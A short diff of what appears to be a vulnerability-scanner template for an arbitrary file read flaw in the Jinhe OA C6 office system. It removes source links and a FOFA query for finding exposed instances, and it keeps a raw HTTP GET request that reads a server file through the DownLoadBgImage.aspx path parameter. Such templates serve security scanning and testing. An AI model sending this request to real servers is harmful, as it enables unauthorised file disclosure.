@@ -3,12 +3,8 @@ info:
   name: 金和OA C6 DownLoadBgImage存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rva52z146c23u75e'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rva52z146c23u75e
-    fofa: body="JHSoft.Web.AddMenu" || app="金和网络-金和OA"
 http:
 - raw:
   - 'GET /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/js/PasswordNew.js HTTP/1.1
